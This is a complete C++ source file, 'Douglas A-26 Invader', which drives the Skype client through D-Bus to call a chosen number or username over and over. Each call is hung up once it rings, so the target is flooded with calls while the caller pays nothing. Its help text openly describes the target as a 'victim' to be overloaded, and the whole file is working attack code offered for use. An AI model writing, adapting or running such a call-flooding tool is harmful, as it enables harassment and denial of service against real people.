/*
* Douglas A-26 Invader
* Skype calls overloader. 
* Current version: 1.0.
*
*
* by hagall (asbrandr@jabber.ru)
* Rev1, 120601
*/

/*
    Douglas A-26 Invader. Skype calls overloader.
    Copyright (C) 2012  hagall (asbrandr@jabber.ru)

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/ 
   
#include <glib.h>
#include <dbus/dbus-glib.h>
#include <unistd.h>
#include <boost/regex.hpp>
#include <boost/program_options/options_description.hpp>
#include <boost/program_options/cmdline.hpp>
#include <boost/program_options/variables_map.hpp>
#include <boost/program_options/parsers.hpp>
#include <iostream>
#include <string>

#define N_(String) String

using namespace boost;
namespace 	po = boost::program_options;

static DBusGProxy 	*proxy_send 		= NULL;
static DBusGConnection 	*gDBusConnection 	= NULL;

unsigned int		ringWaitFor 		= 2000;
unsigned int 		sleep_after_ring 	= 10000;


/*	Help		*/
static char* helpMsg = N_(
"\"Douglas A-26 Invader\"\n"
"Just because you can.\n"
"Usage:       douglas-a26 [PARAMETERS] NUMBER — command.\n"
"Version:     1.0 (from May,31 2012)\n"
"Author       hagall (jid: asbrandr@jabber.ru)\n"
"Description: The damn program that overloads your victim with Skype calls, \n"
"snowing him/her up to the eyes. The basic principle is simple: \"A-26\" calls\n"
"the victim, wait for ring tones, then hangs up and repeats, again and again.\n"
"Because we hang up before the victim gets to a phone, no money will be charged\n"
"off from your account. The whole process is absolutely free. And you can play\n"
"around with \"hang-after\" option and specify time delay before hangup.\n"
"Hey, and don't forget to turn your microphone off!\n"
"\n"
"Allowed options"
);

/*	Fancy terminal output	*/
static char C_FAIL[]="\033[1;31;40m";
static char C_CLEAR[]="\033[1;0m";


/*	Failure codes description, taken from Skype API reference		*/
static char* failure_reasons[] = {
NULL,
"Miscelanneous error.",
"User or phone number does not exist. Check that a prefix is entered for the phone number, either in the form 003725555555 or +3725555555; the form 3725555555 is incorrect.",
"User is offline",
"No proxy found",
"Session terminated.",
"No common codec found.",
"Sound I/O error.",
"Problem with remote sound device.",
"Call blocked by recipient.",
"Recipient not a friend.",
"Current user not authorized by recipient.",
"Sound recording error.",
"Failure to call a commercial contact.",
"Conference call has been dropped by the host."
};

static unsigned int failure_r_count = 14;
/*
 ------------------------------------------------------------------------------
 Connect to DBus
 Rev1, 120531
*/
DBusGConnection *dbusConnect() 
{
	GError *error = NULL;

	if (!gDBusConnection) 
	{
		gDBusConnection = dbus_g_bus_get(DBUS_BUS_SESSION, &error);

		if (!gDBusConnection) 
		{
			std::cout << C_FAIL;
			if (error)
			{
				std::cout << "[ERROR] Cannot connect to DBus: " <<  error->message  << std::endl;
				g_error_free(error);
			}
			else
			{
				std::cout << "[ERROR] Cannot connect to DBus." << std::endl;
			}

			std::cout << C_CLEAR;
			return NULL;
		}
	}
	return gDBusConnection;
}

/*
 ------------------------------------------------------------------------------
 Send message to skype
 Rev1, 120531
*/
gchar *skype_send_message(const char *command) 
{
						// Connecting to DBus
	DBusGConnection *dbusConnection = dbusConnect();

	GError *error = NULL;
	if (!proxy_send) 
	{
		proxy_send = dbus_g_proxy_new_for_name(	dbusConnection,
                                           		"com.Skype.API",
                                           		"/com/Skype",
                                           		"com.Skype.API");
	}

	if (!proxy_send) 
	{
		std::cout << C_FAIL;
		std::cout << "[ERROR] Cannot create DBus proxy!" << std::endl;
		std::cout << C_CLEAR;	
		return NULL;
	}

						// Sending message
	gchar *str 	= NULL;
	error 		= NULL;
	if (!dbus_g_proxy_call( proxy_send, "Invoke", &error,
				G_TYPE_STRING, (gchar*)command,
				G_TYPE_INVALID,
				G_TYPE_STRING, &str,
				G_TYPE_INVALID)) 
	{

        	if (error) 
        	{
       			std::cout << C_FAIL;	
        		std::cout << "[ERROR] DBus call error: " << error->message << std::endl;
        		std::cout << C_CLEAR;
	        	g_error_free(error);	        	
	        }
        	else 
        	{
			std::cout << C_FAIL;        	
        		std::cout << "[ERROR] DBus call error. " << std::endl;
        		std::cout << C_CLEAR;
        	}

		return NULL;
	}

	return str;
}

/*
 ------------------------------------------------------------------------------
 Making a call, full cycle 
 Rev1, 120531
*/
signed int make_call(gchar* number)
{
	gchar* ret 	= NULL;
	boost::cmatch	rmatch;
	 
	std::string callstr = "CALL " + std::string(number);
	
	boost::regex call_status("CALL (\\d+) STATUS (\\w+)");
	ret = skype_send_message(callstr.c_str());

	if (!ret)
	{
		std::cout << C_FAIL;	
		std::cout << "[ERROR] Lost connection with skype. Will be terminated." << std::endl;
		std::cout << C_CLEAR;
		return -1;
	}

	boost::regex_search(ret, rmatch, call_status);
	std::cout << "[CALL " << rmatch[1] << "] Dialing." << std::endl;
	std::string lastStatus 	= "UNPLACED";
	std::string call_id	= rmatch[1];

	while (1)
	{
		std::string callid_str = "GET CALL " + call_id + " STATUS";
		ret = skype_send_message(callid_str.c_str());
		if (!ret)
		{	
			std::cout << C_FAIL;	
			std::cout << "[ERROR] Lost connection with skype. Will be terminated." << std::endl;
			std::cout << C_CLEAR;
			return -1;
		}
				
		boost::cmatch regex_match;
		boost::regex_search(ret, regex_match, call_status);
		
		if (regex_match[2] != lastStatus)
		{
			std::cout << "[CALL " << regex_match[1] << "] " << regex_match[2] << std::endl;			
			lastStatus = regex_match[2];
		}
		
		if (regex_match[2] == "RINGING" || regex_match[2] == "EARLYMEDIA")
		{
								// Wait a little and cut the call off
			usleep(ringWaitFor * 1000);
			callid_str = "SET CALL " + regex_match[1] + " STATUS FINISHED";
			gchar* qret = skype_send_message(callid_str.c_str());
			
			if (!qret)
			{
				std::cout << C_FAIL;	
				std::cout << "[ERROR] Lost connection with skype. Will be terminated." << std::endl;
				std::cout << C_CLEAR;
				return -1;
			}
					
			g_free(qret);			
			std::cout << "[INFO] Hung up." << std::endl;
			return 0;
		}
		else if (regex_match[2] == "INPROGRESS" || regex_match[2] == "ONHOLD")
		{
								// Immediately hang up 
			callid_str = "SET CALL " + regex_match[1] + " STATUS FINISHED";
			gchar* qret = skype_send_message(callid_str.c_str());
			if (!qret)
			{
				std::cout << C_FAIL;	
				std::cout << "[ERROR] Lost connection with skype. Will be terminated." << std::endl;
				std::cout << C_CLEAR;
				return -1;
			}
			
			g_free(qret);
						
			std::cout << "[INFO] HE PICKED IT UP!" << std::endl;
			return 0;
		}
		else if (regex_match[2] == "FAILED")
		{
								// Shit happened. So, let's get 
								// and display failure reason.
			boost::regex failregex("CALL \\d+ FAILUREREASON (\\d+)");
			callid_str = "GET CALL " + call_id + " FAILUREREASON";
			gchar* qret = skype_send_message(callid_str.c_str());
			if (!qret)
			{
				std::cout << C_FAIL;
				std::cout << "[ERROR] Lost connection with skype. Will be terminated." << std::endl;
				std::cout << C_CLEAR;
				return -1;
			}
			
			boost::cmatch failmatch;
			boost::regex_search(qret, failmatch, failregex);
			std::string fcode_str = failmatch[1];
			unsigned int failure_code = atoi(fcode_str.c_str());
			if (failure_code <= failure_r_count)
			{
				std::cout << C_FAIL << "[CALL " << call_id << "] Call failed: " << failure_reasons[failure_code] 
					  << C_CLEAR << std::endl;
			}
			else
			{
				std::cout << C_FAIL << "[CALL " << call_id << "] Call failed." << C_CLEAR << std::endl;
			}
			g_free(qret);
			return 0;
		}
		else if ( regex_match[2] == "ROUTING" || regex_match[2] == "UNPLACED")
		{
								// Nothing to do
		}
		else
		{
								// Busy, refused, missing or shit happened.
								// Leaving the proc. 
			callid_str = "SET CALL " + regex_match[1] + " STATUS FINISHED";
			gchar* qret = skype_send_message(callid_str.c_str());
			if (!qret)
			{
				std::cout << C_FAIL;	
				std::cout << "[ERROR] Lost connection with skype. Will be terminated." << std::endl;
				std::cout << C_CLEAR;
				return -1;
			}
			
			g_free(qret);			
			return 0;			
		}
		
		g_free(ret);		
		usleep(100000);					// 100 milliseconds
	}

	return 0;
}


int main(int argc, char **argv)
{

	std::string callNumber;
	
								// Obtaining program options - time delays and something more
	po::options_description desc(helpMsg);
	desc.add_options()
	    ("help", "Display this message")
	    ("hang-after", po::value<unsigned int>(&ringWaitFor)->default_value(2000),  
	    		   "Time delay (in milliseconds) to wait while user's "
	    		   "phone is ringing. Warning: if you raise that value too "
	    		   "high, the victim may pick it up")
	    ("wait-after", po::value<unsigned int>(&sleep_after_ring)->default_value(10000), 
	    		  "Time (in milliseconds) to wait after the call before we make next one")
	    ("number", po::value< std::string >(), "A number (or username) to call.")
	;	
	
	po::variables_map vm;
		
	try
	{	
		po::positional_options_description p;
		p.add("number", -1);
		
		po::store(po::command_line_parser(argc, argv).
        		options(desc).positional(p).run(), vm);		
		po::notify(vm);		
	}
	catch(...)
	{
		std::cout << "Invalid command line." << std::endl;
		return 0;
	}
	
	if (vm.count("help"))
	{
		std::cout << desc << std::endl;
		return 0;
	}
	
	if (!vm.count("number"))
	{
		std::cout << desc << std::endl;
		return 0;
	}
	
	callNumber = vm["number"].as< std::string >();
	
	
  	g_type_init();

	gchar *ret 		= NULL;
	
	std::cout << std::endl << "\"Douglas A-26 Invader\"" << std::endl;
	std::cout << "------------------------------------------" << std::endl;	
	std::cout << "Copyright (C) 2012  hagall (asbrandr@jabber.ru)" << std::endl;
    	std::cout << "This program comes with ABSOLUTELY NO WARRANTY;" << std::endl;
    	std::cout << "This is free software, and you are welcome to redistribute it " << std::endl;
    	std::cout << "under certain conditions; for details visit www.gnu.org" << std::endl;
    	
	std::cout << "------------------------------------------" << std::endl;    	
	

								// Authorizing
	std::cout << "[INFO] Gaining access..." << std::endl;
	
	ret = skype_send_message("NAME A-26");
	if (!g_strcmp0(ret, "OK"))
	{
		std::cout << "[INFO] Access granted." << std::endl;
	}
	else if (!g_strcmp0(ret, "ERROR 68"))
	{
		std::cout << C_FAIL << "[ERROR] Access denied" << C_CLEAR << std::endl;
		return 1;
	}
	else
	{
		if (ret)
			std::cout << C_FAIL << "[ERROR] " << ret << C_CLEAR << std::endl;
		return 1;
	}

								// Protocol match confirmation
	ret = skype_send_message("PROTOCOL 7");
	if (g_strcmp0(ret, "PROTOCOL 7"))
	{

		std::cout <<  C_FAIL << "[ERROR] Protocol mismatch! 'PROTOCOL 7' expected, got '" << ret << "'!" << C_CLEAR << std::endl;
		return 1;
	}
	
	std::cout << "[INFO] Protocol match confirmed." << std::endl;	
	std::cout << "------------------------------------------" << std::endl;
		
								// Obtaining user status 
	ret = skype_send_message("GET CURRENTUSERHANDLE");
	boost::regex username_m("CURRENTUSERHANDLE ([a-zA-Z0-9]+)");
	boost::cmatch rmatch;
	boost::regex_search(ret, rmatch, username_m);
	std::cout << "Login  | " << rmatch[1] << std::endl;
	
	ret = skype_send_message("GET USERSTATUS");
	boost::regex userstatus_m("USERSTATUS (\\w+)");
	boost::regex_search(ret, rmatch, userstatus_m);	
	if (rmatch[1] == "OFFLINE")
	{
		std::cout << "Status | " << C_FAIL << rmatch[1] << C_CLEAR << std::endl;
		std::cout << "------------------------------------------" << std::endl;
		std::cout << "Cannot proceed because your account is offline." << std::endl;
		return 0;
	}
	std::cout << "Status | " << rmatch[1] << std::endl;
	std::cout << "------------------------------------------" << std::endl;
	
								// Let's roll
	while (1)
	{
		signed int res = make_call((gchar*)callNumber.c_str());
		if (res < 0)
			return 0;
		usleep(sleep_after_ring * 1000);
		std::cout << "------------------------------------------" << std::endl;
	}
	
	return 0;
}
